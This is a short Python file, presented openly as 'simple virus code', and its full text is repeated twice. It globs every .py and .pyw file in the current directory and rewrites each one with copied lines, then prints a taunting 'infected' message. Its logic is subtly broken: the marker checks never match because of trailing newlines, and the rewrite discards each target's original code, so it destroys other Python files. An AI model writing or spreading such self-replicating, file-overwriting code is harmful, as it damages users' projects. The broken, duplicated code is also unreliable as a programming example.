'''Simple virus code

	THREE PARTS

	1. Make a copy of the virus program
	2. Infect other python files with the virus replication code
	3. Execute/implement the virus code to the system

	* It is paramount that the comment for "BEGING VIRUS CODE"
	 remains otherwise change the string for replication below
'''

# BEGIN VIRUS CODE
import sys
import glob
from glob import glob


# 1. DEFINE SELF-REPLICATION
virus_code = []		# use array to store the innocent portion of the file
this_file = sys.argv[0]
with open(this_file, 'r') as f:
	lines = f.readlines()

# mark which portion of the file (the virus code) should be passed to other files
self_replicating_portion_of_code = False

# go through the file to be infected
for line in lines:

	if line == "# BEGIN VIRUS CODE":		# string from line 14 of this file
		self_replicating_portion_of_code = True

	if not self_replicating_portion_of_code:
		virus_code.append(line)

	if line == "# END VIRUS CODE":
		break


# 2. INFECT OTHER PYTHON FILES
other_python_files = glob('*.py') + glob('*.pyw')

for file in other_python_files:
	with open(file,'r') as f:
		other_files_code = f.readlines()


		# set check for whether file is already infected by us
		already_infected = False

		for line in other_files_code:
			if line == "# BEGIN VIRUS CODE":
				already_infected = True

		# reset the code to include the virus at the top of that file
		if not already_infected:
			other_files_code = []
			other_files_code.extend(virus_code)
			other_files_code.extend('\n')
			other_files_code.extend(other_files_code)

		# finally, rewrite the other file
		with open(file, 'w') as f:
			f.writelines(other_files_code)


# 3. WRITE VIRUS INSTRUCTIONS
def malicious_code():
	print("YOU HAVE BEEN INFECTED HAHAHA !!!")


malicious_code()
# END VIRUS CODE







'''Simple virus code

	THREE PARTS

	1. Make a copy of the virus program
	2. Infect other python files with the virus replication code
	3. Execute/implement the virus code to the system

	* It is paramount that the comment for "BEGING VIRUS CODE"
	 remains otherwise change the string for replication below
'''

# BEGIN VIRUS CODE
import sys
import glob
from glob import glob


# 1. DEFINE SELF-REPLICATION
virus_code = []		# use array to store the innocent portion of the file
this_file = sys.argv[0]
with open(this_file, 'r') as f:
	lines = f.readlines()

# mark which portion of the file (the virus code) should be passed to other files
self_replicating_portion_of_code = False

# go through the file to be infected
for line in lines:

	if line == "# BEGIN VIRUS CODE":		# string from line 14 of this file
		self_replicating_portion_of_code = True

	if not self_replicating_portion_of_code:
		virus_code.append(line)

	if line == "# END VIRUS CODE":
		break


# 2. INFECT OTHER PYTHON FILES
other_python_files = glob('*.py') + glob('*.pyw')

for file in other_python_files:
	with open(file,'r') as f:
		other_files_code = f.readlines()


		# set check for whether file is already infected by us
		already_infected = False

		for line in other_files_code:
			if line == "# BEGIN VIRUS CODE":
				already_infected = True

		# reset the code to include the virus at the top of that file
		if not already_infected:
			other_files_code = []
			other_files_code.extend(virus_code)
			other_files_code.extend('\n')
			other_files_code.extend(other_files_code)

		# finally, rewrite the other file
		with open(file, 'w') as f:
			f.writelines(other_files_code)


# 3. WRITE VIRUS INSTRUCTIONS
def malicious_code():
	print("YOU HAVE BEEN INFECTED HAHAHA !!!")


malicious_code()
# END VIRUS CODE







